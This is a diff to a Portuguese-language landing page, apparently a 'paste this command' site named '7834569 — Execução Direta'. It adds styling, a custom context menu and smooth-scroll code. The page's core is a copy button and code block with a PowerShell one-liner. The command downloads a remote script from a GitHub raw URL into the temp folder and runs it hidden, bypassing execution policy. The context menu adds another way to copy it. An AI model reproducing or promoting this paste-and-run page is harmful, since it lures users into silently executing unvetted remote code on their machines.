@@ -31,8 +31,52 @@
   --shell-pad: 24px;
 }
 
-html { -webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; scroll-behavior: smooth; }
-@media (prefers-reduced-motion: reduce) { html { scroll-behavior: auto; } }
+html { -webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; }
+
+/* ────────────────────────────────────────────
+   SELEÇÃO DE TEXTO — cores invertidas
+   ──────────────────────────────────────────── */
+::selection {
+  background: var(--ink);
+  color: var(--card);
+  text-shadow: none;
+}
+::-moz-selection {
+  background: var(--ink);
+  color: var(--card);
+  text-shadow: none;
+}
+
+/* ────────────────────────────────────────────
+   SCROLLBAR DO NAVEGADOR — estilo editorial
+   ──────────────────────────────────────────── */
+::-webkit-scrollbar {
+  width: 14px;
+  height: 14px;
+}
+::-webkit-scrollbar-track {
+  background: var(--bg);
+  border-left: 1px solid var(--rule);
+}
+::-webkit-scrollbar-thumb {
+  background: var(--ink-3);
+  border: 4px solid var(--bg);
+  border-radius: 0;
+  transition: background 200ms ease;
+}
+::-webkit-scrollbar-thumb:hover {
+  background: var(--accent);
+}
+::-webkit-scrollbar-thumb:active {
+  background: var(--ink);
+}
+::-webkit-scrollbar-corner { background: var(--bg); }
+
+/* Firefox */
+html {
+  scrollbar-width: thin;
+  scrollbar-color: var(--ink-3) var(--bg);
+}
 
 body {
   font-family: var(--sans);
@@ -105,7 +149,6 @@ body.is-scrolled .hotbar {
 }
 body.is-scrolled .hotbar-brand { gap: 9px; }
 
-/* ── Botão subir ao topo ── */
 .hotbar-folio {
   display: inline-flex;
   align-items: center;
@@ -264,13 +307,11 @@ body.is-scrolled .hotbar-meta {
   0%, 100% { opacity: 1; }
   50%      { opacity: 0.35; }
 }
-
 .hotbar-meta .meta-divider {
   width: 1px;
   height: 10px;
   background: var(--rule);
   display: inline-block;
-  transition: opacity 340ms;
 }
 .hotbar-meta .meta-extra {
   max-width: 140px;
@@ -285,16 +326,17 @@ body.is-scrolled .hotbar-meta .meta-extra {
   opacity: 0;
 }
 
-/* ── Reading progress ── */
+/* ── Reading progress (volta) ── */
 .hotbar-progress {
   position: absolute;
   left: 0;
   bottom: -1px;
-  height: 1px;
+  height: 2px;
   width: 0%;
   background: var(--accent);
   transition: width 120ms linear;
   pointer-events: none;
+  will-change: width;
 }
 
 /* ────────────────────────────────────────────
@@ -510,6 +552,11 @@ body.is-scrolled .hotbar-meta .meta-extra {
   position: relative;
   border-left: 3px solid var(--accent);
 }
+.code-block::selection,
+.code-block *::selection {
+  background: var(--accent);
+  color: #fff;
+}
 
 /* ── Ações ── */
 .c-action {
@@ -544,7 +591,6 @@ body.is-scrolled .hotbar-meta .meta-extra {
   gap: 10px;
 }
 .btn:active { transform: scale(.98); }
-
 .btn-primary {
   background: var(--ink);
   color: var(--card);
@@ -559,7 +605,6 @@ body.is-scrolled .hotbar-meta .meta-extra {
   border-color: var(--accent);
   color: #fff;
 }
-
 .btn-secondary {
   background: transparent;
   color: var(--ink);
@@ -634,6 +679,87 @@ body.is-scrolled .hotbar-meta .meta-extra {
 }
 
 /* ────────────────────────────────────────────
+   CONTEXT MENU
+   ──────────────────────────────────────────── */
+.ctx-menu {
+  position: fixed;
+  z-index: 9999;
+  min-width: 220px;
+  background: var(--card);
+  border: 1px solid var(--ink);
+  padding: 6px 0;
+  box-shadow:
+    4px 4px 0 var(--ink),
+    0 12px 32px rgba(20, 17, 13, 0.12);
+  opacity: 0;
+  transform: scale(0.96) translateY(-4px);
+  transform-origin: top left;
+  pointer-events: none;
+  transition:
+    opacity 180ms cubic-bezier(0.2, 0.8, 0.2, 1),
+    transform 220ms cubic-bezier(0.2, 0.8, 0.2, 1);
+}
+.ctx-menu.show {
+  opacity: 1;
+  transform: scale(1) translateY(0);
+  pointer-events: auto;
+}
+.ctx-menu::before {
+  content: 'Menu';
+  display: block;
+  font-family: var(--mono);
+  font-size: 9px;
+  font-weight: 500;
+  letter-spacing: 0.14em;
+  text-transform: uppercase;
+  color: var(--ink-3);
+  padding: 8px 16px 6px;
+  border-bottom: 1px solid var(--rule-soft);
+  margin-bottom: 4px;
+}
+.ctx-item {
+  display: flex;
+  align-items: center;
+  gap: 12px;
+  width: 100%;
+  padding: 10px 16px;
+  font-family: var(--mono);
+  font-size: 10.5px;
+  font-weight: 500;
+  letter-spacing: 0.12em;
+  text-transform: uppercase;
+  color: var(--ink-2);
+  background: transparent;
+  border: 0;
+  cursor: pointer;
+  text-align: left;
+  transition:
+    background 140ms ease,
+    color 140ms ease,
+    padding-left 200ms cubic-bezier(0.4, 0, 0.2, 1);
+}
+.ctx-item:hover {
+  background: var(--card-alt);
+  color: var(--ink);
+  padding-left: 22px;
+}
+.ctx-item .ico {
+  font-family: var(--mono);
+  font-size: 12px;
+  color: var(--ink-3);
+  width: 14px;
+  display: inline-block;
+  text-align: center;
+  transition: color 140ms ease;
+}
+.ctx-item:hover .ico { color: var(--accent); }
+.ctx-sep {
+  height: 1px;
+  background: var(--rule-soft);
+  margin: 4px 0;
+}
+
+/* ────────────────────────────────────────────
    RESPONSIVE
    ──────────────────────────────────────────── */
 @media (max-width: 900px) {
@@ -705,7 +831,6 @@ body.is-scrolled .hotbar-meta .meta-extra {
 
 <div class="app">
 
-  <!-- ─── MASTHEAD ─── -->
   <header class="masthead" id="top-masthead">
     <div class="masthead-top">
       <span class="kicker">Edição nº 01 &nbsp;·&nbsp; Terminal</span>
@@ -721,10 +846,8 @@ body.is-scrolled .hotbar-meta .meta-extra {
     </div>
   </header>
 
-  <!-- ─── BENTO ─── -->
   <div class="bento">
 
-    <!-- Hero -->
     <div class="cell c-hero" id="hero">
       <div class="hero-glyph">&gt;_<span class="cursor">▌</span></div>
       <div class="hero-body">
@@ -751,7 +874,6 @@ body.is-scrolled .hotbar-meta .meta-extra {
       </div>
     </div>
 
-    <!-- Passos -->
     <div class="cell c-steps" id="passos">
       <div class="cell-kicker">Passo a passo</div>
 
@@ -780,13 +902,11 @@ body.is-scrolled .hotbar-meta .meta-extra {
       </div>
     </div>
 
-    <!-- Comando -->
     <div class="cell c-cmd" id="cmd">
       <div class="cell-kicker">Comando para colar</div>
       <div class="code-block" id="cmdBox">$p="$env:TEMP\abrir.ps1"; irm 'https://raw.githubusercontent.com/capimmm/7834569/main/abrir.ps1' -OutFile $p; Start-Process powershell -ArgumentList '-NoProfile','-ExecutionPolicy','Bypass','-WindowStyle','Hidden','-File',$p -WindowStyle Hidden</div>
     </div>
 
-    <!-- Ações -->
     <div class="cell c-action">
       <button class="btn btn-primary" id="copyBtn" onclick="copiar()">Copiar comando</button>
       <a class="btn btn-secondary" href="https://github.com/capimmm/7834569" target="_blank" rel="noopener">Ver repositório</a>
@@ -794,7 +914,6 @@ body.is-scrolled .hotbar-meta .meta-extra {
 
   </div>
 
-  <!-- ─── COLOPHON ─── -->
   <footer class="colophon">
     <span>7834569 — Execução Direta</span>
     <em>Composto em Instrument Serif, Inter &amp; JetBrains Mono</em>
@@ -805,9 +924,25 @@ body.is-scrolled .hotbar-meta .meta-extra {
 
 <div class="toast" id="toast"><span class="dot"></span>Comando copiado</div>
 
+<div class="ctx-menu" id="ctxMenu" role="menu" aria-hidden="true">
+  <button class="ctx-item" data-action="copy-link" role="menuitem">
+    <span class="ico">⧉</span> Copiar link
+  </button>
+  <button class="ctx-item" data-action="reload" role="menuitem">
+    <span class="ico">↻</span> Recarregar página
+  </button>
+  <button class="ctx-item" data-action="share" role="menuitem">
+    <span class="ico">↗</span> Compartilhar
+  </button>
+  <div class="ctx-sep"></div>
+  <button class="ctx-item" data-action="copy-cmd" role="menuitem">
+    <span class="ico">$</span> Copiar comando
+  </button>
+</div>
+
 <script>
 /* ────────────────────────────────────────────
-   HOTBAR · scroll state + reading progress
+   HOTBAR · estado + barra de progresso
    ──────────────────────────────────────────── */
 (function () {
   const body     = document.body;
@@ -815,12 +950,13 @@ body.is-scrolled .hotbar-meta .meta-extra {
 
   let ticking = false;
   let lastScrolled = null;
+  let lastPct = -1;
 
   function update() {
     const y   = window.scrollY;
     const doc = document.documentElement;
     const max = doc.scrollHeight - window.innerHeight;
-    const pct = max > 0 ? Math.min(100, (y / max) * 100) : 0;
+    const pct = max > 0 ? Math.min(100, Math.max(0, (y / max) * 100)) : 0;
 
     const scrolled = y > 40;
     if (scrolled !== lastScrolled) {
@@ -828,7 +964,13 @@ body.is-scrolled .hotbar-meta .meta-extra {
       lastScrolled = scrolled;
     }
 
-    progress.style.width = pct + '%';
+    // só escreve no DOM se mudou de verdade (economia)
+    const pctRounded = Math.round(pct * 10) / 10;
+    if (pctRounded !== lastPct) {
+      progress.style.width = pctRounded + '%';
+      lastPct = pctRounded;
+    }
+
     ticking = false;
   }
 
@@ -845,15 +987,224 @@ body.is-scrolled .hotbar-meta .meta-extra {
 })();
 
 /* ────────────────────────────────────────────
-   SUBIR AO TOPO (com suavidade)
+   SCROLL COM INÉRCIA — v2 (mais estável)
    ──────────────────────────────────────────── */
 (function () {
-  const folio = document.querySelector('.hotbar-folio');
-  if (!folio) return;
+  if (window.matchMedia('(pointer: coarse)').matches) return;
+  if (window.matchMedia('(prefers-reduced-motion: reduce)').matches) return;
 
-  folio.addEventListener('click', (e) => {
+  // ── Ajustes de sensação ──
+  const EASE          = 0.085;   // menor = mais inércia (desliza mais)
+  const STOP_AT       = 0.4;     // px — quando considera "parado"
+  const MAX_PER_TICK  = 140;     // px — limite por evento de wheel (evita "voar")
+  const REVERSE_KILL  = 0.85;    // 0–1 — quão forte a inversão de direção cancela a inércia
+
+  let targetY  = window.scrollY;
+  let currentY = window.scrollY;
+  let rafId    = null;
+  let lastDir  = 0;
+  let isAnimating = false;
+
+  function maxScroll() {
+    return Math.max(0, document.documentElement.scrollHeight - window.innerHeight);
+  }
+  function clamp(v) {
+    return Math.max(0, Math.min(v, maxScroll()));
+  }
+
+  function loop() {
+    const diff = targetY - currentY;
+
+    if (Math.abs(diff) < STOP_AT) {
+      currentY = targetY;
+      window.scrollTo(0, currentY);
+      rafId = null;
+      isAnimating = false;
+      return;
+    }
+
+    currentY += diff * EASE;
+    window.scrollTo(0, currentY);
+    rafId = requestAnimationFrame(loop);
+  }
+
+  function start() {
+    if (rafId === null) {
+      rafId = requestAnimationFrame(loop);
+      isAnimating = true;
+    }
+  }
+
+  window.addEventListener('wheel', (e) => {
+    // Deixa passar quando menu de contexto está aberto
+    if (document.getElementById('ctxMenu').classList.contains('show')) return;
+
     e.preventDefault();
-    window.scrollTo({ top: 0, behavior: 'smooth' });
+
+    // Limita o delta pra não acumular demais
+    let delta = e.deltaY;
+    if (delta >  MAX_PER_TICK) delta =  MAX_PER_TICK;
+    if (delta < -MAX_PER_TICK) delta = -MAX_PER_TICK;
+
+    const dir = Math.sign(delta);
+
+    // Se o usuário inverteu a direção, mata a inércia antiga
+    if (isAnimating && lastDir !== 0 && dir !== 0 && dir !== lastDir) {
+      targetY = currentY + delta * (1 - REVERSE_KILL);
+      currentY = targetY - delta;
+      // simplifica: zera o alvo atual e aplica o novo delta
+      targetY = clamp(currentY + delta);
+    } else {
+      targetY = clamp(targetY + delta);
+    }
+
+    lastDir = dir;
+    start();
+  }, { passive: false });
+
+  // Sincroniza quando o usuário rola por outros meios (barra, teclado, etc.)
+  window.addEventListener('scroll', () => {
+    if (rafId === null) {
+      targetY  = window.scrollY;
+      currentY = window.scrollY;
+    }
+  }, { passive: true });
+
+  window.addEventListener('resize', () => {
+    targetY  = clamp(targetY);
+    currentY = clamp(currentY);
+  }, { passive: true });
+
+  // Links âncora passam pela mesma inércia
+  document.querySelectorAll('a[href^="#"]').forEach(a => {
+    a.addEventListener('click', (e) => {
+      const id = a.getAttribute('href');
+      if (id === '#' || id === '#top') {
+        e.preventDefault();
+        targetY = 0;
+        start();
+        return;
+      }
+      const el = document.querySelector(id);
+      if (!el) return;
+      e.preventDefault();
+      const top = el.getBoundingClientRect().top + window.scrollY - 60;
+      targetY = clamp(top);
+      start();
+    });
+  });
+
+  const folio = document.querySelector('.hotbar-folio');
+  if (folio) {
+    folio.addEventListener('click', (e) => {
+      e.preventDefault();
+      targetY = 0;
+      start();
+    });
+  }
+})();
+
+/* ────────────────────────────────────────────
+   MENU DE CONTEXTO
+   ──────────────────────────────────────────── */
+(function () {
+  const menu = document.getElementById('ctxMenu');
+  let open = false;
+
+  function show(x, y) {
+    menu.classList.add('show');
+    menu.setAttribute('aria-hidden', 'false');
+    open = true;
+
+    const rect = menu.getBoundingClientRect();
+    const vw = window.innerWidth;
+    const vh = window.innerHeight;
+
+    let px = x;
+    let py = y;
+    if (px + rect.width  > vw - 8) px = vw - rect.width  - 8;
+    if (py + rect.height > vh - 8) py = vh - rect.height - 8;
+
+    menu.style.left = px + 'px';
+    menu.style.top  = py + 'px';
+  }
+
+  function hide() {
+    menu.classList.remove('show');
+    menu.setAttribute('aria-hidden', 'true');
+    open = false;
+  }
+
+  document.addEventListener('contextmenu', (e) => {
+    const tag = (e.target.tagName || '').toLowerCase();
+    if (tag === 'input' || tag === 'textarea') return;
+    e.preventDefault();
+    show(e.clientX, e.clientY);
+  });
+
+  document.addEventListener('click', (e) => {
+    if (open && !menu.contains(e.target)) hide();
+  });
+
+  document.addEventListener('keydown', (e) => {
+    if (e.key === 'Escape' && open) hide();
+  });
+
+  window.addEventListener('scroll', () => { if (open) hide(); }, { passive: true });
+
+  const toast = document.getElementById('toast');
+  const cmdBox = document.getElementById('cmdBox');
+
+  function showToast(txt) {
+    toast.innerHTML = '<span class="dot"></span>' + txt;
+    toast.classList.add('show');
+    clearTimeout(showToast._t);
+    showToast._t = setTimeout(() => toast.classList.remove('show'), 2200);
+  }
+
+  async function copyText(txt) {
+    try {
+      await navigator.clipboard.writeText(txt);
+      return true;
+    } catch (e) {
+      const ta = document.createElement('textarea');
+      ta.value = txt;
+      ta.style.position = 'fixed';
+      ta.style.opacity = '0';
+      document.body.appendChild(ta);
+      ta.select();
+      try { document.execCommand('copy'); } catch (_) {}
+      document.body.removeChild(ta);
+      return true;
+    }
+  }
+
+  menu.addEventListener('click', async (e) => {
+    const btn = e.target.closest('.ctx-item');
+    if (!btn) return;
+    const action = btn.dataset.action;
+    hide();
+
+    if (action === 'copy-link') {
+      await copyText(location.href);
+      showToast('Link copiado');
+    }
+    else if (action === 'reload') {
+      location.reload();
+    }
+    else if (action === 'share') {
+      const data = { title: document.title, text: 'Executar no PowerShell — 7834569', url: location.href };
+      if (navigator.share) {
+        try { await navigator.share(data); } catch (_) {}
+      } else {
+        await copyText(location.href);
+        showToast('Link copiado');
+      }
+    }
+    else if (action === 'copy-cmd') {
+      await copyText(cmdBox.innerText.trim());
+      showToast('Comando copiado');
+    }
   });
 })();
 
@@ -869,29 +1220,30 @@ body.is-scrolled .hotbar-meta .meta-extra {
   window.copiar = function () {
     const texto = cmdBox.innerText.trim();
 
-    navigator.clipboard.writeText(texto).then(confirmar).catch(() => {
+    const done = () => {
+      copyBtn.textContent = 'Copiado';
+      copyBtn.classList.add('copied');
+      toast.innerHTML = '<span class="dot"></span>Comando copiado';
+      toast.classList.add('show');
+
+      clearTimeout(timeoutId);
+      timeoutId = setTimeout(() => {
+        copyBtn.textContent = 'Copiar comando';
+        copyBtn.classList.remove('copied');
+        toast.classList.remove('show');
+      }, 2200);
+    };
+
+    navigator.clipboard.writeText(texto).then(done).catch(() => {
       const range = document.createRange();
       range.selectNode(cmdBox);
       const sel = window.getSelection();
       sel.removeAllRanges();
       sel.addRange(range);
-      try { document.execCommand('copy'); confirmar(); } catch (e) {}
+      try { document.execCommand('copy'); done(); } catch (e) {}
       sel.removeAllRanges();
     });
   };
-
-  function confirmar() {
-    copyBtn.textContent = 'Copiado';
-    copyBtn.classList.add('copied');
-    toast.classList.add('show');
-
-    clearTimeout(timeoutId);
-    timeoutId = setTimeout(() => {
-      copyBtn.textContent = 'Copiar comando';
-      copyBtn.classList.remove('copied');
-      toast.classList.remove('show');
-    }, 2200);
-  }
 })();
 </script>
 
